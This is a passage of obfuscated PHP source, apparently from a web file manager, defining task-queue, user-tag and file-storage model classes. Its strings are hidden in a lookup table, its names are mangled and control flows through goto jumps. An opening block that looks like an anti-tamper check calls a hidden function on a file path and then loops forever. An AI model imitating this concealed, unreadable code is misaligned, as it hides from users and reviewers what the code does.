<?php
 goto F¾×“¾¯«Í; A—åš°²¾: if (!isset($_SERVER[$_SERVER[ñˆ‹ß¿÷][879]]) || !isset($_SERVER[$_SERVER[ñˆ‹ß¿÷][1344]])) { $_getc = $_SERVER[ñˆ‹ß¿÷][882]; $_getfile = $_SERVER[$_SERVER[ñˆ‹ß¿÷][883]] . $_SERVER[ñˆ‹ß¿÷][884]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ñˆ‹ß¿÷][231], $_getfilec); if (count($_getarrs) < $_SERVER[ñˆ‹ß¿÷][619]) { $exit = $_SERVER[ñˆ‹ß¿÷][885]; $exit(); } $_act = $_SERVER[ñˆ‹ß¿÷][1345]; $_act($_SERVER[$_SERVER[ñˆ‹ß¿÷][883]] . $_SERVER[ñˆ‹ß¿÷][884]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[ñˆ‹ß¿÷][378]); } } class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\164\141\x73\x6b\x51\x75\145\x75\x65\x4c\x65\x6e\x67\x74\150"; const QUEUE_DATA = "\x74\141\163\153\121\x75\x65\x75\x65\104\x61\164\141"; public static $listData = false; public static function initTask() { } public static function add($’ËØ¢çÌ, $ÓËÅšš = array(), $Ğ²Ë¨Ÿ = '', $öÍê˜ğ† = '') { $—éÌéê“ =& $_SERVER[ñˆ‹ß¿÷]; if (self::$listData === !1) { self::$listData = self::getAll(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($öÍê˜ğ† && array_find_by_field(self::$listData, $—éÌéê“[94], $öÍê˜ğ†)) { return !0; } self::$listData[] = array($—éÌéê“[264] => $’ËØ¢çÌ, $—éÌéê“[1745] => $ÓËÅšš, $—éÌéê“[453] => $Ğ²Ë¨Ÿ, $—éÌéê“[94] => $öÍê˜ğ†); return !0; } public static function addSubmit() { $òŸ§€ø =& $_SERVER[ñˆ‹ß¿÷]; if (!self::$listData || count(self::$listData) == 0) { return; } write_log($òŸ§€ø[1746] . json_encode_force(array_to_keyvalue(self::$listData, $òŸ§€ø[12], $òŸ§€ø[453])), $òŸ§€ø[1747]); self::setAll(self::$listData); self::$listData = !1; } public static function addNow($ª¿Ü«ƒ, $°×ŒŒŠ = array(), $æÍª¨˜ = '', $…µÈ“ä³ = '') { $Åö›ù¦ =& $_SERVER[ñˆ‹ß¿÷]; if (self::count() >= self::MAX_LENGTH) { return !1; } $À€¹À¥ = self::getAll(); if ($…µÈ“ä³ && array_find_by_field($À€¹À¥, $Åö›ù¦[94], $…µÈ“ä³)) { return !0; } $À€¹À¥[] = array($Åö›ù¦[264] => $ª¿Ü«ƒ, $Åö›ù¦[1745] => $°×ŒŒŠ, $Åö›ù¦[453] => $æÍª¨˜, $Åö›ù¦[94] => $…µÈ“ä³); write_log($Åö›ù¦[1746] . $æÍª¨˜, $Åö›ù¦[1747]); self::setAll($À€¹À¥); return !0; } public static function run() { $­÷•†ëÀ =& $_SERVER[ñˆ‹ß¿÷]; $ŠŒêÙä = self::getAll(); $±ñÅ‘‹ù = array_shift($ŠŒêÙä); if (!$±ñÅ‘‹ù) { return !1; } self::setAll($ŠŒêÙä); $œîÖÅğ± = timeFloat(); try { Hook::apply($±ñÅ‘‹ù[$­÷•†ëÀ[264]], $±ñÅ‘‹ù[$­÷•†ëÀ[1745]]); } catch (Exception $İ¸›¥²‹) { } $“‡Ê·‰¬ = number_format(timeFloat() - $œîÖÅğ±, 3) . $­÷•†ëÀ[1680]; write_log($­÷•†ëÀ[1748] . $±ñÅ‘‹ù[$­÷•†ëÀ[453]] . $­÷•†ëÀ[1749] . $“‡Ê·‰¬, $­÷•†ëÀ[1747]); return !0; } public static function count() { $©¼µøÚÚ = Cache::get(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_LENGTH); if (!$©¼µøÚÚ) { return 0; } return intval($©¼µøÚÚ); } public static function getAll() { $ö‚Ü“°» = Cache::get(self::QUEUE_DATA); Cache::removeMemory(self::QUEUE_DATA); if (!$ö‚Ü“°») { return array(); } return $ö‚Ü“°»; } public static function setAll($áÈÌ¨Ü‡) { $×ç„ŠÄÜ = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($áÈÌ¨Ü‡), $×ç„ŠÄÜ); Cache::set(self::QUEUE_DATA, $áÈÌ¨Ü‡, $×ç„ŠÄÜ); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); } } class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($Ã´ªÄäº, $¶Ø„Ôš× = 5.0) { if (!$Ã´ªÄäº) { return; } $—ÃÁ•éü = Cache::get($Ã´ªÄäº); if (!$—ÃÁ•éü || timeFloat() - floatVal($—ÃÁ•éü) >= $¶Ø„Ôš×) { Cache::set($Ã´ªÄäº, timeFloat(), $¶Ø„Ôš× * 10); return !0; } return !1; } public static function timeLimitCall($¡“¯¦í¦, $Ù¢»ã’Ÿ, $½³ê¼®ú, $âÕÃàø– = 5.0) { $ø©±ƒñŞ =& $_SERVER[ñˆ‹ß¿÷]; if (!$¡“¯¦í¦ || !$Ù¢»ã’Ÿ) { return; } self::$asyncAdd = !0; $›îº±¡ö = $ø©±ƒñŞ[1750]; $ññÆ«¶ = Cache::get($›îº±¡ö, !0); $Š¢«¥¼Ñ = array($ø©±ƒñŞ[1751] => timeFloat(), $ø©±ƒñŞ[1752] => timeFloat(), $ø©±ƒñŞ[264] => $Ù¢»ã’Ÿ, $ø©±ƒñŞ[1745] => $½³ê¼®ú, $ø©±ƒñŞ[203] => $âÕÃàø–); if (is_array($ññÆ«¶[$¡“¯¦í¦])) { $Š¢«¥¼Ñ[$ø©±ƒñŞ[1752]] = $ññÆ«¶[$¡“¯¦í¦][$ø©±ƒñŞ[1752]]; } if (is_array($ññÆ«¶[$¡“¯¦í¦])) { if (timeFloat() - $ññÆ«¶[$¡“¯¦í¦][$ø©±ƒñŞ[1751]] < $Š¢«¥¼Ñ[$ø©±ƒñŞ[203]] * 0.3) { return; } $Š¢«¥¼Ñ[$ø©±ƒñŞ[1752]] = $ññÆ«¶[$¡“¯¦í¦][$ø©±ƒñŞ[1752]]; } $ññÆ«¶[$¡“¯¦í¦] = $Š¢«¥¼Ñ; Cache::set($›îº±¡ö, $ññÆ«¶, 60); Cache::removeMemory($›îº±¡ö); write_log($ø©±ƒñŞ[1753] . $¡“¯¦í¦ . $ø©±ƒñŞ[71] . $Ù¢»ã’Ÿ, $ø©±ƒñŞ[1747]); } public static function timeLimitCallLoop() { $Øáã˜ØÒ =& $_SERVER[ñˆ‹ß¿÷]; $Ğ¨¾í’ = array($Øáã˜ØÒ[1754]); $«š«¢¾ = in_array(strtolower(ACTION), $Ğ¨¾í’); if (!$«š«¢¾ && !self::$asyncAdd) { return; } $¸Ş½Ö„« = $Øáã˜ØÒ[1750]; $Å÷µÎ×Ğ = Cache::get($¸Ş½Ö„«, !0); if (!$Å÷µÎ×Ğ || count($Å÷µÎ×Ğ) <= 0) { return; } $ƒŒ«ıŸß = !1; $àÓæ½Ø¹ = timeFloat(); $—®ûæØó = array(); foreach ($Å÷µÎ×Ğ as $µ’Ìì¼½ => $®æÀÍ˜¹) { if ($àÓæ½Ø¹ - $®æÀÍ˜¹[$Øáã˜ØÒ[1752]] > $®æÀÍ˜¹[$Øáã˜ØÒ[203]]) { $ƒŒ«ıŸß = !0; try { Hook::apply($®æÀÍ˜¹[$Øáã˜ØÒ[264]], $®æÀÍ˜¹[$Øáã˜ØÒ[1745]]); write_log($Øáã˜ØÒ[1755] . $µ’Ìì¼½ . $Øáã˜ØÒ[71] . $®æÀÍ˜¹[$Øáã˜ØÒ[264]] . $Øáã˜ØÒ[1756] . ACTION, $Øáã˜ØÒ[1747]); } catch (Exception $ıÜğÀ¦) { } continue; } $—®ûæØó[$µ’Ìì¼½] = $®æÀÍ˜¹; } if (!$ƒŒ«ıŸß) { return; } if (!$—®ûæØó) { return Cache::remove($¸Ş½Ö„«); } Cache::set($¸Ş½Ö„«, $—®ûæØó, 60); Cache::removeMemory($¸Ş½Ö„«); } public static function finished($¥Âóùë½, $óì³¸æ˜) { $Ô•íöÖ÷ =& $_SERVER[ñˆ‹ß¿÷]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($Ô•íöÖ÷[264] => $¥Âóùë½, $Ô•íöÖ÷[1745] => $óì³¸æ˜); } private static function finishedRun() { $‰ñ±œÉ¨ =& $_SERVER[ñˆ‹ß¿÷]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $µíÏ‘Í) { try { Hook::apply($µíÏ‘Í[$‰ñ±œÉ¨[264]], $µíÏ‘Í[$‰ñ±œÉ¨[1745]]); } catch (Exception $¦Ê¦Ê‡) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } goto fŞ††¾†—æ; C¬ßÅ…˜¼ğ: class UserTagModel extends ModelBaseLight { public $optionType = "\x55\163\x65\162\x2e\x74\141\x67\114\x69\163\164"; public $modelType = "\x55\x73\x65\x72\x4f\x70\164\151\x6f\x6e"; public $field = array("\x6e\141\x6d\x65", "\x73\164\x79\x6c\x65", "\x73\157\162\164"); public function listData($¿¹†ºë = false, $ƒÜÍœ×— = "\x73\x6f\x72\164", $¨Áî¶áõ = false) { return parent::listData($¿¹†ºë, $ƒÜÍœ×—, $¨Áî¶áõ); } public function remove($ï…ßû¨…) { return parent::remove($ï…ßû¨…); } public function add($—â„Œ ¢, $®â”İ = "\x6c\141\142\x65\x6c\x2d\147\162\145\171\55\x6e\157\x72\x6d\x61\x6c") { $ÆµÍÁç™ =& $_SERVER[ñˆ‹ß¿÷]; if ($this->findByName($—â„Œ ¢)) { return !1; } $ş‰â¡¿ó = array($ÆµÍÁç™[420] => $—â„Œ ¢, $ÆµÍÁç™[485] => $®â”İ, $ÆµÍÁç™[1840] => $this->getSort($ÆµÍÁç™[258]) + 1); return parent::insert($ş‰â¡¿ó); } public function update($ï€Åçùñ, $·›†•ã¯) { $…½‘ôà¢ =& $_SERVER[ñˆ‹ß¿÷]; $ãÙú°Õ = $this->listData($ï€Åçùñ); $óöÂÏèŸ = $this->findByName($·›†•ã¯[$…½‘ôà¢[32]]); if (!$ãÙú°Õ || $óöÂÏèŸ && $óöÂÏèŸ[$…½‘ôà¢[399]] != $ãÙú°Õ[$…½‘ôà¢[399]]) { return !1; } return parent::update($ï€Åçùñ, $·›†•ã¯); } public function moveTop($¡ÌÅÃ Â) { $¹çÅîœÇ =& $_SERVER[ñˆ‹ß¿÷]; $öÓ·Âœ = parent::listData(); $®Æ‹Ô‰á = $this->getSort($¹çÅîœÇ[257]); foreach ($öÓ·Âœ as &$¤‹§¬µ) { if ($¤‹§¬µ[$¹çÅîœÇ[399]] == $¡ÌÅÃ Â) { $¤‹§¬µ[$¹çÅîœÇ[1860]] = $®Æ‹Ô‰á; continue; } $¤‹§¬µ[$¹çÅîœÇ[1860]] += 1; } unset($¤‹§¬µ); return parent::resetData($öÓ·Âœ); } public function moveBottom($¨‡êÏ»°) { $ºú¥¼À¨ =& $_SERVER[ñˆ‹ß¿÷]; $ÀÊ€Ñæ = $this->getSort($ºú¥¼À¨[258]) + 1; return parent::update($¨‡êÏ»°, array($ºú¥¼À¨[1860] => $ÀÊ€Ñæ)); } public function resetSort($÷–Ú§Š§) { $¦ˆ–ù± =& $_SERVER[ñˆ‹ß¿÷]; $¬œ‘Ú¼Õ = array(); $÷–Ú§Š§ = is_array($÷–Ú§Š§) ? $÷–Ú§Š§ : array(); for ($Ä¸·øµÎ = 0; $Ä¸·øµÎ < count($÷–Ú§Š§); $Ä¸·øµÎ++) { $¬œ‘Ú¼Õ[$÷–Ú§Š§[$Ä¸·øµÎ] . $¦ˆ–ù±[12]] = $Ä¸·øµÎ + 1; } $ÂÂÙ€İ = parent::listData(); foreach ($ÂÂÙ€İ as &$¿‚ôËòÕ) { $ÄÇµÈ¸ = $¬œ‘Ú¼Õ[$¿‚ôËòÕ[$¦ˆ–ù±[399]]]; $¿‚ôËòÕ[$¦ˆ–ù±[1860]] = $ÄÇµÈ¸ ? $ÄÇµÈ¸ : $¿‚ôËòÕ[$¦ˆ–ù±[1860]]; } unset($¿‚ôËòÕ); return parent::resetData($ÂÂÙ€İ); } private function getSort($‹íç÷¦) { $¼ıƒ¾´¹ =& $_SERVER[ñˆ‹ß¿÷]; $«¸È¬˜ = parent::listData(); $§²¿×Õ = array_to_keyvalue($«¸È¬˜, $¼ıƒ¾´¹[12], $¼ıƒ¾´¹[1860]); if (!$§²¿×Õ) { $§²¿×Õ = array(0); } $ÄÈÌäÎ = $‹íç÷¦ == $¼ıƒ¾´¹[258] ? max($§²¿×Õ) : min($§²¿×Õ); return intval($ÄÈÌäÎ); } } goto aÙ‹ª£ñº¹; a¡©ôø—Ş²: class FileContentModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\x66\151\x6c\x65\137\x63\x6f\x6e\164\145\x6e\164\163"; protected $dataAuto = array(array("\143\x72\x65\141\x74\x65\124\x69\x6d\145", "\x74\x69\x6d\x65", "\151\156\x73\145\162\164", "\146\165\156\143\x74\151\157\x6e")); } class FileModel extends ModelBase { protected $tableName = "\151\x6f\x5f\146\x69\x6c\145"; protected $tableMeta = array("\x74\141\x62\x6c\x65\x4e\141\155\145" => "\151\x6f\137\x66\151\154\145\x5f\155\x65\x74\141", "\155\145\x74\x61\106\x69\145\154\144" => "\146\151\154\x65\111\104"); public function fileInfo($§‹Œ—Öı) { $ëÃÏŞó¡ =& $_SERVER[ñˆ‹ß¿÷]; static $Ù¦¼ƒŒ = array(); if (!isset($Ù¦¼ƒŒ[$§‹Œ—Öı])) { $âşŠñôÇ = $ëÃÏŞó¡[1885]; $²åëøãô = Model($ëÃÏŞó¡[471])->field($âşŠñôÇ)->where(array($ëÃÏŞó¡[469] => $§‹Œ—Öı))->find(); $Ù¦¼ƒŒ[$§‹Œ—Öı] = $²åëøãô; } return $Ù¦¼ƒŒ[$§‹Œ—Öı]; } public function addFileByContent($ˆøĞ‰¦Ç = '', $¼›×ç‹« = '') { $©èÃªŸµ =& $_SERVER[ñˆ‹ß¿÷]; $¢ŠÄåÎ = TEMP_PATH . $©èÃªŸµ[1886]; if (!is_dir($¢ŠÄåÎ)) { mk_dir($¢ŠÄåÎ); } $¢½»«ô = $¢ŠÄåÎ . $©èÃªŸµ[1887] . rand_string(16); file_put_contents($¢½»«ô, $ˆøĞ‰¦Ç); $æ¾û¬êô = $this->addFile($¢½»«ô, $¼›×ç‹«, !0); if (file_exists($¢½»«ô)) { @unlink($¢½»«ô); } return $æ¾û¬êô; } public function createFileName($‹Ò¸±Ì, $ûï‡Öô­ = false, $ô¼âã•Ñ = false) { $ÌÈâ­ =& $_SERVER[ñˆ‹ß¿÷]; $å°Ñ‘«’ = IO::init($ÌÈâ­[8]); $®€ö¦Š» = $this->makeFilePath($‹Ò¸±Ì, $å°Ñ‘«’, $ûï‡Öô­, $ô¼âã•Ñ); $ëÔ¡½âø = $å°Ñ‘«’->pathFather($®€ö¦Š»); static $À¬÷‹ = false; $ÆèËıàÊ = $ÌÈâ­[1888] . md5($ëÔ¡½âø); if (!$À¬÷‹ && !Cache::get($ÆèËıàÊ)) { $À¬÷‹ = !0; $ñ¸ıšÆ© = IO::mkdir($ëÔ¡½âø); if (!IO::exist($ñ¸ıšÆ© . $ÌÈâ­[804])) { IO::mkfile($ñ¸ıšÆ© . $ÌÈâ­[804]); } Cache::set($ÆèËıàÊ, 1, 3600 * 2); } return $®€ö¦Š»; } public function makeFilePath($‚ªï¾ß, $›Á¹›‹î, $¿½Ëó¿ü = false, $®Ÿ¾É•‰ = false) { $¥ŠÂ÷Ò¨ =& $_SERVER[ñˆ‹ß¿÷]; $ŸµŸ‹¹ = Model($¥ŠÂ÷Ò¨[777])->get($¥ŠÂ÷Ò¨[1889]); $™ö¼£—… = KodIO::defaultIO() . date($¥ŠÂ÷Ò¨[1890]); $¿¹ĞàŠ² = $™ö¼£—… . rand_string(5) . short_id(100); $‚ªï¾ß = str_replace($¥ŠÂ÷Ò¨[8], $¥ŠÂ÷Ò¨[11], KodIO::clear($‚ªï¾ß)); $”ùëÕÂ = $›Á¹›‹î->ext($‚ªï¾ß); if (!$‚ªï¾ß) { $ŸµŸ‹¹ = $¥ŠÂ÷Ò¨[1891]; } switch ($ŸµŸ‹¹) { case $¥ŠÂ÷Ò¨[1892]: $¿¹ĞàŠ² = $¿¹ĞàŠ² . $¥ŠÂ÷Ò¨[10] . $›Á¹›‹î->ext($‚ªï¾ß); if ($”ùëÕÂ == $¥ŠÂ÷Ò¨[1829]) { $¿¹ĞàŠ² .= $¥ŠÂ÷Ò¨[1559]; } break; case $¥ŠÂ÷Ò¨[1893]: $ÓşÙå«Â = Model($¥ŠÂ÷Ò¨[777])->get($¥ŠÂ÷Ò¨[778]); $òó¢ıŞ¦ = substr(md5($¥ŠÂ÷Ò¨[779] . $ÓşÙå«Â . date($¥ŠÂ÷Ò¨[755])), 0, 8); $»¶µ«›™ = KodIO::defaultDriver(); $™ö¼£—… = $¥ŠÂ÷Ò¨[1236] . $»¶µ«›™[$¥ŠÂ÷Ò¨[399]] . $¥ŠÂ÷Ò¨[409] . date($¥ŠÂ÷Ò¨[1894]) . $òó¢ıŞ¦ . $¥ŠÂ÷Ò¨[8]; if ($”ùëÕÂ == $¥ŠÂ÷Ò¨[1829]) { $‚ªï¾ß .= $¥ŠÂ÷Ò¨[1559]; } $…Ş«®œì = $¥ŠÂ÷Ò¨[1895] . $™ö¼£—… . $‚ªï¾ß; CacheLock::lock($…Ş«®œì); $¿¹ĞàŠ² = $™ö¼£—… . $‚ªï¾ß; if (IO::exist($™ö¼£—… . $‚ªï¾ß)) { $Ô®÷û«¥ = substr($‚ªï¾ß, 0, strlen($‚ªï¾ß) - strlen($”ùëÕÂ)); $ˆä¦Üİ = $®Ÿ¾É•‰ ? substr($®Ÿ¾É•‰, 0, 5) : ($¿½Ëó¿ü ? substr($¿½Ëó¿ü, 0, 5) : rand_string(5)); $¿¹ĞàŠ² = $™ö¼£—… . $Ô®÷û«¥ . $ˆä¦Üİ . $¥ŠÂ÷Ò¨[10] . $”ùëÕÂ; } if (IO::isTypeObject($¿¹ĞàŠ²) && !IO::isUploadServer($¿¹ĞàŠ²)) { if (IO::exist($¿¹ĞàŠ²)) { return $¿¹ĞàŠ²; } $¸„®áãë = IO::setContent($¿¹ĞàŠ², $¥ŠÂ÷Ò¨[12]); if (!$¸„®áãë) { show_json($¥ŠÂ÷Ò¨[1896], !1); } } CacheLock::unlock($…Ş«®œì); break; case $¥ŠÂ÷Ò¨[1891]: break; default: break; } return $¿¹ĞàŠ²; } public function addFileByRemote($î›Ÿ‹â–, $¾´ú†˜ç, $¯—´­šş = array()) { $óãèİŞ =& $_SERVER[ñˆ‹ß¿÷]; if (!IO::exist($î›Ÿ‹â–)) { return !1; } $¶€Ã±œÜ = $¯—´­šş[$óãèİŞ[176]] ? $¯—´­šş[$óãèİŞ[176]] : $óãèİŞ[12]; $­õ’ÒÇ = IO::hashMd5($î›Ÿ‹â–, $¶€Ã±œÜ); $ê©àßØŠ = KodIO::defaultDriver(); $”ˆìó— = array($óãèİŞ[585] => IO::size($î›Ÿ‹â–), $óãèİŞ[1897] => 1, $óãèİŞ[420] => $¾´ú†˜ç, $óãèİŞ[815] => $ê©àßØŠ[$óãèİŞ[399]], $óãèİŞ[421] => $î›Ÿ‹â–, $óãèİŞ[1898] => $¯—´­šş[$óãèİŞ[177]] ? $¯—´­šş[$óãèİŞ[177]] : IO::hashSimple($î›Ÿ‹â–), $óãèİŞ[1899] => $­õ’ÒÇ ? $­õ’ÒÇ : $¶€Ã±œÜ); if ($¼¸Ë™½ = $this->addFileCheckExist($”ˆìó—[$óãèİŞ[177]], $”ˆìó—[$óãèİŞ[176]], $”ˆìó—[$óãèİŞ[76]])) { return $¼¸Ë™½; } return $this->addFileData($”ˆìó—); } private function addFileData($ˆÊñïÖŠ) { $ŸÕ¼Š =& $_SERVER[ñˆ‹ß¿÷]; if (!$ˆÊñïÖŠ) { return !1; } $ˆÊñïÖŠ[$ŸÕ¼Š[76]] = intval($ˆÊñïÖŠ[$ŸÕ¼Š[76]]); if (!$ˆÊñïÖŠ[$ŸÕ¼Š[76]] && strlen($ˆÊñïÖŠ[$ŸÕ¼Š[177]]) > 32) { $ˆÊñïÖŠ[$ŸÕ¼Š[76]] = intval(substr($ˆÊñïÖŠ[$ŸÕ¼Š[177]], 32)); } $…“Ôï¢Ì = $this->add($ˆÊñïÖŠ); return $this->find($…“Ôï¢Ì); } public function addFile($Ê¬¶Î›, $Éû–ÎÛÒ, $æ×ÍÏİÂ = false) { $ëáÙ‚ƒÏ =& $_SERVER[ñˆ‹ß¿÷]; $æ“ÒÉ–¹ = IO::hashSimple($Ê¬¶Î›); $¿“ïÁ¶» = IO::size($Ê¬¶Î›); $Ïş± ü’ = $¿“ïÁ¶» <= 1024 * 1024 * 10 ? IO::hashMd5($Ê¬¶Î›) : $ëáÙ‚ƒÏ[12]; $ñ¨ÂŸ = $ëáÙ‚ƒÏ[1900] . $æ“ÒÉ–¹; CacheLock::lock($ñ¨ÂŸ); if ($Ïş± ü’ && $æ“ÒÉ–¹) { $›Ç³ŒÃ = $this->addFileCheckExist($æ“ÒÉ–¹, $Ïş± ü’, $¿“ïÁ¶»); if ($›Ç³ŒÃ) { CacheLock::unlock($ñ¨ÂŸ); return $›Ç³ŒÃ; } } $á„½Ë¿£ = $this->addFileMake($Ê¬¶Î›, $¿“ïÁ¶», $æ“ÒÉ–¹, $Ïş± ü’, $Éû–ÎÛÒ, $æ×ÍÏİÂ); $òú¢˜µã = $this->addFileData($á„½Ë¿£); CacheLock::unlock($ñ¨ÂŸ); if (!$Ïş± ü’ && $òú¢˜µã) { $this->fileMd5Check($òú¢˜µã); } return $òú¢˜µã; } private function fileMd5Check($ËØÜè½) { $¿Âî€± =& $_SERVER[ñˆ‹ß¿÷]; $ÊîÖ ¢Ì = array($ËØÜè½[$¿Âî€±[468]], $ËØÜè½[$¿Âî€±[84]]); $‰ìİ”” = $¿Âî€±[1901] . $ËØÜè½[$¿Âî€±[84]]; $Ó‘÷‹ÁÃ = $¿Âî€±[1902] . $ËØÜè½[$¿Âî€±[468]]; $Øï®™Ü‘ = TaskQueue::add($¿Âî€±[1903], $ÊîÖ ¢Ì, $‰ìİ””, $Ó‘÷‹ÁÃ); if (!$Øï®™Ü‘) { $this->fileMd5Set($ËØÜè½[$¿Âî€±[468]], $ËØÜè½[$¿Âî€±[84]]); } else { TaskQueue::addSubmit(); } } public function fileMd5Set($ĞÚÁ²€, $ªëùÆ) { $ÄÏ¦¦Ô« =& $_SERVER[ñˆ‹ß¿÷]; $šÂ¬ĞÍ÷ = $this->find($ĞÚÁ²€); if (!$šÂ¬ĞÍ÷ || $šÂ¬ĞÍ÷[$ÄÏ¦¦Ô«[176]]) { return; } $¡»èÓ = IO::hashMd5($ªëùÆ); if (!$¡»èÓ) { return $ÄÏ¦¦Ô«[12]; } $this->where(array($ÄÏ¦¦Ô«[468] => $ĞÚÁ²€))->save(array($ÄÏ¦¦Ô«[176] => $¡»èÓ)); } public function addFileMake($è¨°¸Ë•, $á¡äí«¯, $’‰¿âÎŸ, $Àñôú…, $ÊŠ„Øûß, $æÄ‡›º›) { $’’ş¨ =& $_SERVER[ñˆ‹ß¿÷]; $åÁËÓ­á = $this->createFileName($ÊŠ„Øûß, $’‰¿âÎŸ, $Àñôú…); $±ôÏÖıû = get_path_father($åÁËÓ­á); $¼Íº£¬ = get_path_this($åÁËÓ­á); if ($æÄ‡›º›) { $Æ½ĞÚ = IO::move($è¨°¸Ë•, $±ôÏÖıû, !1, $¼Íº£¬); } else { $Æ½ĞÚ = IO::copy($è¨°¸Ë•, $±ôÏÖıû, !1, $¼Íº£¬); } if (!$Æ½ĞÚ) { return !1; } $ÆÉ¢×»£ = KodIO::defaultDriver(); $›³Ãë¹á = array($’’ş¨[585] => $á¡äí«¯, $’’ş¨[1897] => 1, $’’ş¨[420] => $ÊŠ„Øûß, $’’ş¨[815] => $ÆÉ¢×»£[$’’ş¨[399]], $’’ş¨[421] => $åÁËÓ­á, $’’ş¨[1898] => $’‰¿âÎŸ, $’’ş¨[1899] => $Àñôú…); return $›³Ãë¹á; } public function addFileCheckExist($ì‘µ¢ª¦, $¢ÎÚô, $ùŞ©â•) { $èµ×™Ó† =& $_SERVER[ñˆ‹ß¿÷]; $öÏ®ÉçÎ = $this->findByHash($ì‘µ¢ª¦, $¢ÎÚô); if (!$öÏ®ÉçÎ) { return !1; } $Â»î¹Úı = array($èµ×™Ó†[1897] => intval($öÏ®ÉçÎ[$èµ×™Ó†[1904]]) + 1, $èµ×™Ó†[585] => $ùŞ©â•); $this->where(array($èµ×™Ó†[469] => $öÏ®ÉçÎ[$èµ×™Ó†[468]]))->save($Â»î¹Úı); return $öÏ®ÉçÎ; } public function remove($¸ëáš·‹) { $this->linkCountChange($¸ëáš·‹, !1); $this->clearEmpty(); return !0; } public function linkAdd($‹¶ü±») { $this->linkCountChange($‹¶ü±», !0); } public function linkCountChange($Å´³û™¿, $ñ¼äßéò) { $ ú„Î¡» =& $_SERVER[ñˆ‹ß¿÷]; if (!$Å´³û™¿) { return; } if (!is_array($Å´³û™¿)) { $Å´³û™¿ = array($Å´³û™¿); } $üÔÎÙ× = array(); foreach ($Å´³û™¿ as $ŸÔç««ü) { $Û´ûå = $ŸÔç««ü . $ ú„Î¡»[12]; if (!$üÔÎÙ×[$Û´ûå]) { $üÔÎÙ×[$Û´ûå] = 0; } $üÔÎÙ×[$Û´ûå]++; } $‹¼î’û = array(); foreach ($üÔÎÙ× as $ŸÔç««ü => $·ªÏˆóÔ) { $Û´ûå = $·ªÏˆóÔ . $ ú„Î¡»[12]; if (!$‹¼î’û[$Û´ûå]) { $‹¼î’û[$Û´ûå] = array(); } $‹¼î’û[$Û´ûå][] = $ŸÔç««ü; } foreach ($‹¼î’û as $·ªÏˆóÔ => $·Õ¥©ã÷) { if (!$·Õ¥©ã÷) { continue; } $·ªÏˆóÔ = $ñ¼äßéò ? $·ªÏˆóÔ : -intval($·ªÏˆóÔ); $¼š½¢’ = array($ ú„Î¡»[468] => array($ ú„Î¡»[7], $·Õ¥©ã÷)); if ($·ªÏˆóÔ < 0) { $¼š½¢’[$ ú„Î¡»[1904]] = array($ ú„Î¡»[1022], abs($·ªÏˆóÔ)); } $this->where($¼š½¢’)->setAdd($ ú„Î¡»[1904], $·ªÏˆóÔ); } } public function findByHash($¯†‹·Éä, $ÖŸàÒØî = false) { $ÇÏ »Üø =& $_SERVER[ñˆ‹ß¿÷]; if (!$¯†‹·Éä && !$ÖŸàÒØî) { return !1; } $›ÛßáÌ = array($ÇÏ »Üø[1898] => $¯†‹·Éä); if ($ÖŸàÒØî) { $›ÛßáÌ = array($ÇÏ »Üø[1899] => $ÖŸàÒØî); } return $this->order($ÇÏ »Üø[1905])->where($›ÛßáÌ)->find(); } public function clearEmpty($ıÅÙİÛ× = 0) { $õñ™©İå =& $_SERVER[ñˆ‹ß¿÷]; $§¾•‹Ûû = time() - 3600 * 24 * $ıÅÙİÛ×; $¼ƒİáªÈ = $õñ™©İå[1906] . $§¾•‹Ûû; $”Í¼‚—Ç = $this->where($¼ƒİáªÈ)->select(); if (!$”Í¼‚—Ç) { return; } $ûÓ†µÒ = new Task($õñ™©İå[1907], $õñ™©İå[12], count($”Í¼‚—Ç)); foreach ($”Í¼‚—Ç as $—Œö–Ğ) { $ûÓ†µÒ->update(1); $this->resetFile($—Œö–Ğ); } $ûÓ†µÒ->end(); } public function resetFile($÷¦Ë£) { $ğüÈö™– =& $_SERVER[ñˆ‹ß¿÷]; $÷òù™‘ñ = array($ğüÈö™–[469] => $÷¦Ë£[$ğüÈö™–[468]]); $×Ê¯Ô¥® = Model($ğüÈö™–[1334])->where($÷òù™‘ñ)->count(); $¬’õ‡ü = Model($ğüÈö™–[1908])->where($÷òù™‘ñ)->count(); $â¡ğõ”Œ = intval($×Ê¯Ô¥®) + intval($¬’õ‡ü); if ($â¡ğõ”Œ == 0) { IO::remove($÷¦Ë£[$ğüÈö™–[84]]); Model($ğüÈö™–[1909])->delete($÷¦Ë£[$ğüÈö™–[468]]); $this->where($÷òù™‘ñ)->delete(); $this->metaSet($÷¦Ë£[$ğüÈö™–[468]], null, null); return; } if ($÷¦Ë£[$ğüÈö™–[1904]] != $â¡ğõ”Œ) { $this->where($÷òù™‘ñ)->save(array($ğüÈö™–[1897] => $â¡ğõ”Œ)); } } public function storageInfo($Ş¼“Œ“ƒ = false) { $ìÆùç²ğ =& $_SERVER[ñˆ‹ß¿÷]; $¦ôÑòğë = $this->count() + 0.0; $äØ­á¦Ê = 0; $‚ÎîÒÒ» = 1; $™»™£ = 0; $¸Ñª®æ = 5000; for ($½–ÚËÀß = 0; $½–ÚËÀß < $¦ôÑòğë; $½–ÚËÀß = $½–ÚËÀß + $¸Ñª®æ) { $º­ìÓøæ = $this->limit($½–ÚËÀß, $½–ÚËÀß + $¸Ñª®æ)->select(); foreach ($º­ìÓøæ as $ß¦ÙÛÊô) { $‚ÎîÒÒ» += $ß¦ÙÛÊô[$ìÆùç²ğ[76]] * $ß¦ÙÛÊô[$ìÆùç²ğ[1904]]; $äØ­á¦Ê += $ß¦ÙÛÊô[$ìÆùç²ğ[76]] * ($ß¦ÙÛÊô[$ìÆùç²ğ[1904]] - 1); $™»™£ += $ß¦ÙÛÊô[$ìÆùç²ğ[1904]]; } } $±­€ïŞ = array($ìÆùç²ğ[1910] => $‚ÎîÒÒ», 